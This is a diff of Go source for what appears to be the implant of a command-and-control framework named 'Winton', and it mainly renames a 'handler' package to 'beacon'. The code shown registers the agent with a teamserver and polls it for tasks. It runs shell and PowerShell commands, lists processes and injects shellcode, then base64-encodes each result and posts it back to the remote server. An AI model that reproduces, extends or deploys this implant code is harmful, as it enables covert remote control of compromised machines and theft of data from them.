@@ -9,17 +9,10 @@ import (
 	"strings"
 	"time"
 
+	"Winton/cmd/beacon"
 	"Winton/cmd/commands"
-	"Winton/cmd/handler"
 	"Winton/cmd/utils"
 )
-
-type Config struct {
-	HttpListener struct {
-		IP   string `yaml:"ip"`
-		Port string `yaml:"port"`
-	} `yaml:"http_listener"`
-}
 
 var (
 	Listener      string
@@ -56,7 +49,7 @@ func Run() error {
 	OSArch := utils.GetSystemInfo()
 	PID := strconv.Itoa(os.Getpid())
 
-	agent := handler.Agent{
+	agent := beacon.Agent{
 		IP:       ip,
 		ExtIP:    "", // TODO
 		Hostname: user.Username,
@@ -69,7 +62,7 @@ func Run() error {
 
 	fmt.Printf("[*] Registering agent, via %s to %s\n", agent.IP, RegisterAgent)
 
-	res, err := handler.Register(agent, RegisterAgent)
+	res, err := beacon.Register(agent, RegisterAgent)
 	if err != nil {
 		fmt.Println(err)
 		return err // kill if this hits
@@ -91,7 +84,7 @@ func Run() error {
 		time.Sleep(5 * time.Second)
 
 		fmt.Println("[*] Checking for tasks")
-		res, err := handler.Check_tasks(agent, GetTask)
+		res, err := beacon.Recv(agent, GetTask)
 		if err != nil {
 			fmt.Println("[!] Error getting tasks, going back to sleep...")
 			fmt.Println(err)
@@ -151,7 +144,7 @@ func Run() error {
 			command_id := task["CommandID"].(string)
 			result := utils.Base64_Encode((jsonFiles))
 
-			result_struct := handler.TaskResult{
+			result_struct := beacon.TaskResult{
 				CommandID: command_id,
 				Result:    result,
 			}
@@ -165,7 +158,7 @@ func Run() error {
 
 			fmt.Println("[*] Sending results to teamserver...")
 
-			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)
+			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)
 			if err != nil {
 				fmt.Println("[!] Error posting results")
 				fmt.Println(err)
@@ -181,7 +174,7 @@ func Run() error {
 			command_id := task["CommandID"].(string)
 			result := utils.Base64_Encode([]byte(commands.Whoami()))
 
-			result_struct := handler.TaskResult{
+			result_struct := beacon.TaskResult{
 				CommandID: command_id,
 				Result:    result,
 			}
@@ -195,7 +188,7 @@ func Run() error {
 
 			fmt.Println("[*] Sending results to teamserver...")
 			fmt.Println(string(jsonResult))
-			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)
+			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)
 			if err != nil {
 				fmt.Println("[!] Error posting results")
 				fmt.Println(err)
@@ -210,7 +203,7 @@ func Run() error {
 			command_id := task["CommandID"].(string)
 			result := utils.Base64_Encode([]byte(commands.Pwd()))
 
-			result_struct := handler.TaskResult{
+			result_struct := beacon.TaskResult{
 				CommandID: command_id,
 				Result:    result,
 			}
@@ -225,7 +218,7 @@ func Run() error {
 			fmt.Println("[*] Sending results to teamserver...")
 			fmt.Println(string(jsonResult))
 
-			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)
+			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)
 			if err != nil {
 				fmt.Println("[!] Error posting results")
 				fmt.Println(err)
@@ -248,7 +241,7 @@ func Run() error {
 
 			result = utils.Base64_Encode([]byte(result))
 
-			result_struct := handler.TaskResult{
+			result_struct := beacon.TaskResult{
 				CommandID: command_id,
 				Result:    result,
 			}
@@ -263,7 +256,7 @@ func Run() error {
 			fmt.Println("[*] Sending results to teamserver...")
 			fmt.Println(string(jsonResult))
 
-			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)
+			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)
 			if err != nil {
 				fmt.Println("[!] Error posting results")
 				fmt.Println(err)
@@ -285,7 +278,7 @@ func Run() error {
 
 			result := utils.Base64_Encode([]byte(shell_res))
 
-			result_struct := handler.TaskResult{
+			result_struct := beacon.TaskResult{
 				CommandID: command_id,
 				Result:    result,
 			}
@@ -300,7 +293,7 @@ func Run() error {
 			fmt.Println("[*] Sending results to teamserver...")
 			fmt.Println(string(jsonResult))
 
-			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)
+			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)
 
 			if err != nil {
 				fmt.Println("[!] Error posting results")
@@ -323,7 +316,7 @@ func Run() error {
 
 			result := utils.Base64_Encode([]byte(ps_res))
 
-			result_struct := handler.TaskResult{
+			result_struct := beacon.TaskResult{
 				CommandID: command_id,
 				Result:    result,
 			}
@@ -338,7 +331,7 @@ func Run() error {
 			fmt.Println("[*] Sending results to teamserver...")
 			fmt.Println(string(jsonResult))
 
-			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)
+			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)
 
 			if err != nil {
 				fmt.Println("[!] Error posting results")
@@ -356,7 +349,7 @@ func Run() error {
 
 			result := utils.Base64_Encode([]byte(pid_res))
 
-			result_struct := handler.TaskResult{
+			result_struct := beacon.TaskResult{
 				CommandID: command_id,
 				Result:    result,
 			}
@@ -371,7 +364,7 @@ func Run() error {
 			fmt.Println("[*] Sending results to teamserver...")
 			fmt.Println(string(jsonResult))
 
-			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)
+			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)
 
 			if err != nil {
 				fmt.Println("[!] Error posting results")
@@ -404,7 +397,7 @@ func Run() error {
 
 			result := utils.Base64_Encode([]byte(res))
 
-			result_struct := handler.TaskResult{
+			result_struct := beacon.TaskResult{
 				CommandID: command_id,
 				Result:    result,
 			}
@@ -419,7 +412,7 @@ func Run() error {
 			fmt.Println("[*] Sending results to teamserver...")
 			fmt.Println(string(jsonResult))
 
-			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)
+			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)
 
 			if err != nil {
 				fmt.Println("[!] Error posting results")
@@ -463,7 +456,7 @@ func Run() error {
 				result = utils.Base64_Encode([]byte("Error injecting shellcode"))
 			}
 
-			result_struct := handler.TaskResult{
+			result_struct := beacon.TaskResult{
 				CommandID: command_id,
 				Result:    result,
 			}
@@ -477,7 +470,7 @@ func Run() error {
 
 			fmt.Println("[*] Sending results to teamserver...")
 
-			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)
+			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)
 			if err != nil {
 				fmt.Println("[!] Error posting results")
 				fmt.Println(err)
@@ -496,7 +489,7 @@ func Run() error {
 			fmt.Println("[*] Task successfully completed, should be automatically removed from queue")
 		} else {
 			fmt.Println("[!] Task failed, let's tell winton that we failed :(")
-			result_struct := handler.TaskResult{
+			result_struct := beacon.TaskResult{
 				CommandID: task["CommandID"].(string),
 				Result:    utils.Base64_Encode([]byte("[!] Something went wrong running that command, you should probably check the agent [!]")),
 			}
@@ -508,7 +501,7 @@ func Run() error {
 				return err // now if this fails, the agent should probably die
 			}
 
-			_, err = handler.Post_results(agent, PostResult, jsonResult, task["CommandID"].(string))
+			_, err = beacon.Send(agent, PostResult, jsonResult, task["CommandID"].(string))
 			if err != nil {
 				fmt.Println("[!] Error posting results")
 				fmt.Println(err)
@@ -520,4 +513,4 @@ func Run() error {
 		}
 	}
 	return nil
-} 
+}
